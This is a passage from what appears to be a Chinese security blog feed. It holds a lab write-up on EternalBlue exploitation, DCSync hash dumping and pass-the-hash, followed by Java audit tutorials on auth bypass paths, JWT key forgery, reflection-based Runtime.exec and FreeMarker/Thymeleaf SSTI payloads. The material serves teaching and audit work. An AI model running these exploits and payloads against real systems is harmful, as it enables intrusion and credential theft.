src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236094331-cf88ea53-321d-47f0-b7b4-753aeb974e67.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2   DC域控</span><br><span class="line">172.22.1.21  MS17-010永恒之蓝</span><br><span class="line">172.22.1.18  信呼OA系统</span><br></pre></td></tr></table></figure><p>看到ms17-010</p><p>kali上msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>直接尝试访问本地用户目录没有找到flag，这边猜测需要域用户访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236798106-eb97002a-7eb3-4451-9964-0f851bdd337c.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">拿到权限后可以用creds_all等命令收集内网凭据，而我们控制的这台机器是有DCSync的权限的(因为这个是DC1，也就是域控制器), 所以能直接从域控上导出Hash</span><br><span class="line"></span><br><span class="line">DCSync攻击:</span><br><span class="line">DCSync的原理是利用域控制器之间的数据同步复制</span><br><span class="line">DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式</span><br><span class="line"></span><br><span class="line">DCSync 攻击前提:</span><br><span class="line"></span><br><span class="line">想进行DCSync 攻击，必须获得以下任一用户的权限：</span><br><span class="line">Administrators 组内的用户</span><br><span class="line">Domain Admins 组内的用户</span><br><span class="line">Enterprise Admins 组内的用户域控制器的计算机帐户</span><br><span class="line">即：默认情况下域管理员组具有该权限</span><br><span class="line"></span><br><span class="line">这里我们用永恒之蓝打完本来就是system权限，然后我们load kiwi，抓取用户的hash</span><br></pre></td></tr></table></figure><p>这里我们抓到了Administrator的hash，所以可以直接用crackmapexec打hash传递了，Administrator是域控的机器账户，就相当于域用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p>打pth</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741237136731-4cbdf52c-963f-43c8-8ebf-8b8e5cab06ab.png"></p><p>参考<a href="https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/">https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计-鉴权</title>
      <link href="/2024/11/28/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%89%B4%E6%9D%83/"/>
      <url>/2024/11/28/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%89%B4%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="鉴权-JWT-Shiro"><a href="#鉴权-JWT-Shiro" class="headerlink" title="鉴权&amp;JWT&amp;Shiro"></a>鉴权&amp;JWT&amp;Shiro</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719146663073-ba6c66ec-d673-47f5-8a89-f763dd7bf6e4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719146674233-c7d71c45-1ee9-4f75-95d9-e65d91f89875.png"></p><h2 id="身份验证-未授权访问-鉴权技术"><a href="#身份验证-未授权访问-鉴权技术" class="headerlink" title="身份验证-未授权访问&amp;鉴权技术"></a>身份验证-未授权访问&amp;鉴权技术</h2><p>1、搜索类别：业务关键字&amp;相关操作类&amp;封装关键字</p><p>2、功能点也适用，直接找鉴权技术特征目录进行代码追溯</p><p>-找有没有Interceptor，拦截器里有没有鉴权</p><p>-找有没有Filter，过滤器里有没有鉴权</p><p>-找有没有Shiro，看版本及里面的逻辑配置</p><p>-找有没有Jwt，看后面写的四个方向确定</p><p>-找以上都没有，看看是不是自写代码逻辑鉴权</p><p>资料补充：</p><p>Interceptor是一种拦截器，也称之为拦截器链（InterceptorChain），主要用于拦截请求、响应或处理过程中的某些事件，比如权限认证、日志记录、性能测试等。在 Java 中，Interceptor可以用来扩展框架，增加或修改某个方法的行为，或者对应用流程做些前置处理、后置处理、环绕处理等。</p><p>Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><p>Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p><p>Jwt：JSON WebToken，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。</p><h2 id="使用Interceptor拦截器进行鉴权"><a href="#使用Interceptor拦截器进行鉴权" class="headerlink" title="使用Interceptor拦截器进行鉴权"></a>使用Interceptor拦截器进行鉴权</h2><h3 id="案例-NewbeeMall-使用拦截器进行鉴权"><a href="#案例-NewbeeMall-使用拦截器进行鉴权" class="headerlink" title="案例-NewbeeMall-使用拦截器进行鉴权"></a>案例-NewbeeMall-使用拦截器进行鉴权</h3><p>下载：<a href="https://github.com/newbee-ltd/newbee-mall">https://github.com/newbee-ltd/newbee-mall</a></p><p>Interceptor-&gt;AdminLoginInterceptor-&gt;preHandle-&gt;uri.startsWith</p><p>如果路径的开头是以&#x2F;admin开头并且Session中的loginUser属性为 null</p><p>利用：构造结构路径为&#x2F;;&#x2F;admin或&#x2F;&#x2F;admin后访问（不影响解析）</p><p>源码中搜shiro和jwt引用，发现没有，看源码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719150304842-7056c458-ff59-4612-8d68-e46ccabec29b.png"></p><p>发现Interceptor拦截器</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719150726092-c11e2fc5-ba10-469e-92f7-71730d0bb1d1.png"> </p><p>如果路径的开头是以&#x2F;admin开头并且Session中的loginUser属性为 null</p><p>看到后台所有页面都在&#x2F;admin目录下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719151047291-20a66b81-5ce2-4e5b-8d1d-51d7bbdf935a.png"></p><p>利用：构造结构路径为&#x2F;;&#x2F;admin或&#x2F;&#x2F;admin后访问（不影响解析）</p><p>为了绕过前面的判断</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719151377936-9ba9c86f-81f4-4373-b429-f1a501eab2e4.png"></p><h2 id="使用Filter过滤器进行鉴权"><a href="#使用Filter过滤器进行鉴权" class="headerlink" title="使用Filter过滤器进行鉴权"></a>使用Filter过滤器进行鉴权</h2><h3 id="案例-华夏ERP-使用过滤器进行鉴权"><a href="#案例-华夏ERP-使用过滤器进行鉴权" class="headerlink" title="案例-华夏ERP-使用过滤器进行鉴权"></a>案例-华夏ERP-使用过滤器进行鉴权</h3><p>下载：<a href="https://github.com/jishenghua/jshERP">https://github.com/jishenghua/jshERP</a></p><p>urlPatterns-&gt;LogCostFilter-&gt;doFilter-&gt;requestUrl,ignoredList,allowUrls</p><p>&#x2F;login.html&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;xiaodi.css&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;user&#x2F;login&#x2F;..&#x2F;..&#x2F;account&#x2F;getAccount</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719153222881-d43b03e7-51f5-4c14-9bc4-fb9973578502.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719153310030-24bb6725-c60c-4dae-aa37-bfc5cdfbccef.png"></p><p>&#x2F;*的意思是访问任何&#x2F;下面的路径都会触发过滤方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719154184224-cec6c41d-ab3b-4823-8dd9-f4e5a268bea7.png"></p><p>&#x2F;login.html&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;xiaodi.css&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;user&#x2F;login&#x2F;..&#x2F;..&#x2F;account&#x2F;getAccount</p><h2 id="使用Shiro框架进行鉴权"><a href="#使用Shiro框架进行鉴权" class="headerlink" title="使用Shiro框架进行鉴权"></a>使用Shiro框架进行鉴权</h2><h3 id="案例-Tumo-Shiro框架鉴权"><a href="#案例-Tumo-Shiro框架鉴权" class="headerlink" title="案例-Tumo-Shiro框架鉴权"></a>案例-Tumo-Shiro框架鉴权</h3><p>下载：<a href="https://github.com/TyCoding/tumo">https://github.com/TyCoding/tumo</a></p><p>1、引用shiro做身份验证</p><p>pom.xml Maven配置文件</p><p><shiro-spring-version>1.5.2</shiro-spring-version></p><p>2、查看shiro配置信息</p><p>anon一般代表不需要鉴权的配置，**则表示该接口下的所有接口。</p><p>tumo.shiro.anon_url&#x3D;\</p><p>&#x2F;login,&#x2F;logout,&#x2F;register,\</p><p>&#x2F;,&#x2F;about,&#x2F;p&#x2F;<strong>,&#x2F;links,&#x2F;comment&#x2F;</strong>,&#x2F;link&#x2F;list,&#x2F;article&#x2F;list,\</p><p>&#x2F;css&#x2F;<strong>,&#x2F;js&#x2F;</strong>,&#x2F;img&#x2F;**</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719157032869-bda3c8b7-9595-4cd7-82ef-50c439e56612.png"></p><p>anon：匿名过滤器，&#x2F;login这几个目录下所有资源都能访问</p><p>&#x2F;article&#x2F;list为例</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719157627017-c3014fc9-d3cc-4f93-9024-d039a8382470.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719158227095-0a3efdb0-3d3a-4646-a871-936c588445e8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719158182140-a64bfbb4-631e-4a64-ab76-0781babdd73c.png"></p><p>3、寻找利用点</p><p>CommentController.java</p><p>@RequestMapping(“&#x2F;comment”)</p><p>@GetMapping(“&#x2F;{id}”)</p><p>@DeleteMapping(“&#x2F;{id}”)</p><p>4、测试</p><p>GET &#x2F;comment&#x2F;1</p><p>DELETE &#x2F;comment&#x2F;1</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719158575722-709b27d5-d8e2-46e4-858f-7300fd10b90e.png"></p><p>注意：除此之外还可以看下这个版本漏洞是否可以绕过</p><h2 id="使用Jwt技术进行鉴权"><a href="#使用Jwt技术进行鉴权" class="headerlink" title="使用Jwt技术进行鉴权"></a>使用Jwt技术进行鉴权</h2><p>JWT审计看以下：</p><p>1、生成时使用空加密（逻辑代码问题）</p><p>2、服务端未校验签名（逻辑代码问题）</p><p>3、密钥默认未被修改（搭建后未修改）</p><p>4、密钥爆破可能性大（密钥过于简单）</p><h3 id="案例1-FastCMS-密钥默认未被修改"><a href="#案例1-FastCMS-密钥默认未被修改" class="headerlink" title="案例1-FastCMS-密钥默认未被修改"></a>案例1-FastCMS-密钥默认未被修改</h3><p>下载：<a href="https://gitee.com/xjd2020/fastcms">https://gitee.com/xjd2020/fastcms</a></p><p>-看数据包获取Jwt技术</p><p>-代码逻辑或引用Jwt包</p><p>createToken-&gt;AuthConfigs-&gt;secretKey-&gt;application.yml</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719235292166-db1b7a48-5da4-48c5-a3e8-3697f6d3625e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719232798973-e668759d-30d9-4c09-b660-23ca25b7faed.png"></p><p>抓包，记得返回响应包</p><p>jwt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719234982733-219fb23a-34c5-4462-ae7c-b02cb779a4d7.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719234932566-c93a9c08-114b-42d4-b48d-0d21d92cb610.png"></p><p>exp是时间戳，是认证到期时间</p><h3 id="案例2-Nacos-密钥默认未被修改"><a href="#案例2-Nacos-密钥默认未被修改" class="headerlink" title="案例2-Nacos-密钥默认未被修改"></a>案例2-Nacos-密钥默认未被修改</h3><p>下载：<a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p><p>参考：<a href="https://blog.csdn.net/qq_50854662/article/details/129660330">https://blog.csdn.net/qq_50854662/article/details/129660330</a></p><p>启动：startup.cmd -m standalone</p><p>nacos.core.auth.plugin.nacos.token.secret.key</p><p>登陆时修改返回的JWT值</p><p>此时用户为nacos</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236505372-aa1d3047-c5dd-4112-9d8b-3ee4078a0534.png"></p><p>填写密钥修改</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236787541-c79ec6c7-d2cb-497a-b0da-516444fc4e09.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236831697-cf2701f5-24b1-413a-af0c-befbb3637eb5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236895284-1ea569ad-421b-410d-bc6b-20e84137facb.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236855236-d547a133-fdc7-4992-b0a2-9bc943e18d37.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射基础(二)</title>
      <link href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(2)/"/>
      <url>/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(2)/</url>
      
        <content type="html"><![CDATA[<h3 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void reflectMethod() &#123;</span><br><span class="line">        System.out.println(&quot;反射测试成功!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;com.reflect.ReflectTest&quot;); // 创建Class对象</span><br><span class="line">            Object m = c.newInstance(); // 创建类实例对象</span><br><span class="line">            Method method = c.getMethod(&quot;reflectMethod&quot;); // 获取reflectMethod方法</span><br><span class="line">            method.invoke(m); // 调用类实例对象方法</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742438547844-e8e66cf4-66ff-464d-bbe9-0875bc61a678.png"></p><h3 id="Java-反射-利用反射构造Runtime类执行"><a href="#Java-反射-利用反射构造Runtime类执行" class="headerlink" title="Java-反射-利用反射构造Runtime类执行"></a>Java-反射-利用反射构造Runtime类执行</h3><p>可以看到先创建class对象再创建实例对象，再获取对应方法，最后再调用就可以成功调用了ReflectTemo方法，那么Runtime是否也可以这样反射呢？</p><p>按照该思路，进行编写代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Object m = c1.newInstance();</span><br><span class="line">        Method method = c1.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        method.invoke(m,&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现报错，原因是因为Runtime类的构造方法是私有的，这里就涉及到了单例模式。比如当web应用来说，数据库连接只用建立连接一次就可以，而不是每次用到都新建连接，此时就可以将数据库连接使用的构造方法设置为私有，使用静态方法来获取</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742439298652-25f08377-0cd0-4c9d-9cf7-6f5fee0a3057.png"></p><p>此时不能newIntance创建类对象，就可以使用getMethod通过反射获取Runtime类下的exec方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742439825643-aeb5f8a4-b4d7-4452-9ad0-445dff8e3dbf.png"></p><p>可以看到exec有六个重载方法，第一个最简单，尝试获取第一个。</p><p>这里再说下invoke，invoke作用是执行方法，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">    Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">    Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line">    execMethod.invoke(runtime, &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742439936683-ada49339-924a-40ea-a720-7f82f610584d.png"></p><p>精简一下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">c1.getMethod(&quot;exec&quot;, String.class).invoke(c1.getMethod(&quot;getRuntime&quot;).invoke(c1),&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br></pre></td></tr></table></figure><p>总结一下invoke，invoke第一个参数：</p><p>如果这个方法是一个普通方法，那么第一个参数是类对象。</p><p>如果这个方法是一个静态方法，那么第一个参数就是类。</p><h3 id="Java-反射-设置setAccessible-true-暴力访问权限"><a href="#Java-反射-设置setAccessible-true-暴力访问权限" class="headerlink" title="Java-反射-设置setAccessible(true)暴力访问权限"></a>Java-反射-设置setAccessible(true)暴力访问权限</h3><p>在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。</p><p>Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。</p><p>所有我们最开始的代码再修改简略下，就能成功命令执行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    Class c1= Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    Constructor m = c1.getDeclaredConstructor();</span><br><span class="line">    m.setAccessible(true);</span><br><span class="line">    c1.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计-ssti</title>
      <link href="/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/"/>
      <url>/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="ssti模版注入"><a href="#ssti模版注入" class="headerlink" title="ssti模版注入"></a>ssti模版注入</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904482502-73be4bb6-db76-4eff-8faf-3c55f54f9317.png"></p><h2 id="SSTI模版注入"><a href="#SSTI模版注入" class="headerlink" title="SSTI模版注入"></a>SSTI模版注入</h2><p>1、找项目中是否存在模版引擎（类型及安全问题）</p><p>2、找模版注入利用入口条件（根据网上已知漏洞复现条件）</p><p>3、找可控地方进行测试检测（根据网上已知漏洞利用条件）</p><h3 id="常见模版说明：见上图"><a href="#常见模版说明：见上图" class="headerlink" title="常见模版说明：见上图"></a>常见模版说明：见上图</h3><p>参考来源：</p><p><a href="https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI">https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI</a></p><p>黑盒中建议判断利用：见70天内容</p><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p><a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></p><h3 id="JavaEE审计-CheckList"><a href="#JavaEE审计-CheckList" class="headerlink" title="JavaEE审计-CheckList"></a>JavaEE审计-CheckList</h3><p>1、功能点-见上图</p><p>2、搜索点-见链接</p><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg</a></p><p>（1）国产软件</p><p>[泛微Ecology] 代码审计、安装说明</p><p>[致远Seeyon] 代码审计、补丁问题</p><p>[用友NC] 代码审计与环境搭建</p><p>[蓝凌Landray] 代码审计与环境搭建</p><p>[泛微E-Office] 代码审计与环境搭建</p><p>[帆软报表] 代码审计与环境搭建</p><p>[拓尔思TRS 内容协作平台WCM] 代码审计与环境搭建</p><p>[通达OA] 代码审计与环境搭建</p><p>[Smartbi] 代码审计与环境搭建</p><p>[RuoYi若依] 代码审计</p><p>[金山终端安全系统] 代码审计</p><p>[慧点OA] 代码审计</p><p>[浙大恩特客户资源管理系统] 代码审计</p><p>[企望制造ERP] 代码审计</p><p>（2）常见组件</p><p>[ThinkPHP] 代码审计</p><p>[Struts2] 漏洞环境下载、OGNL POC、漏洞分析</p><p>[XStream] 审计特点与POC分析</p><p>[NexusRepositoryManager] 代码审计与环境搭建</p><p>（3）Server</p><p>Jetty</p><p>Nginx</p><p>Tomcat</p><p>WebLogic</p><p>JBoss</p><p>TongWeb</p><p>PrimetonPAS</p><p>（4）数据库</p><p>mssql</p><p>mysql</p><p>H2 Database</p><p>CouchDB</p><p>ApacheSolr</p><p>ElasticSearch</p><p>InfluxDB</p><p>ApacheDruid</p><h3 id="FreeMarker-Halo"><a href="#FreeMarker-Halo" class="headerlink" title="#FreeMarker Halo"></a>#FreeMarker Halo</h3><p>freemarker-&gt;模板-&gt;admin&#x2F;themes&#x2F;editor-&gt;.ftl</p><p>&lt;#assign value&#x3D;”freemarker.template.utility.Execute”?</p><p>new()&gt;${value(“calc.exe”)}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719905283947-33b397a1-0d27-4b25-926c-d331871e9be4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719935749356-1ba9881d-2fef-4518-8acb-132b6db9631b.png"></p><p>往index.ftl里面插入payload</p><p>&lt;#assign value&#x3D;”freemarker.template.utility.Execute”?new()&gt; ${value(“calc.exe”)}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936427498-5bfb75a0-6599-46e7-97a0-2f4fb2caa7c1.png"></p><p>插入点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936716866-2500c079-60cf-43f0-b41a-e34b7df34925.png"></p><h3 id="Thymeleaf-Ruoyi"><a href="#Thymeleaf-Ruoyi" class="headerlink" title="#Thymeleaf Ruoyi"></a>#Thymeleaf Ruoyi</h3><p>参考：<a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p><p>Thymeleaf-&gt;return 可控变量-&gt;getNames-&gt;fragment-&gt;缓存监控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="title function_ invoke__">T</span>(java.lang.Runtime).<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(<span class="string">&quot;id&quot;</span>).<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">next</span>()&#125;__::.x</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719937509744-955f6b65-b66e-46a9-b399-0cb8861b1c30.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">GetMapping</span>(<span class="string">&quot;/path&quot;</span>)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">path</span>(@RequestParam String lang) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938239847-b8274432-ddf6-4609-8244-fc0c4bb49b5b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938182916-a8edd387-5018-4733-8455-f89b8ff679be.png"></p><p>抓包分析一下<img 